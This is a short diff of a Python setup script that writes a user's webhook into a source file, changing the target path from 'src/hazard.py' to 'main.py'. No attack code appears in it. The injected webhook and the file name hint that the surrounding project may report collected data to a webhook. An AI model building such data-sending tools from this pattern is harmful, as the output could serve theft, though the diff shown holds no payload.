@@ -10,7 +10,7 @@ try:
   
         data = data.replace(search_text, replace_text)
   
-    with open(r'src/hazard.py', 'w') as file:
+    with open(r'main.py', 'w') as file:
   
         file.write(data)
     print("Successfully wrote your webhook to the src. Make sure again you entered a correct one!")
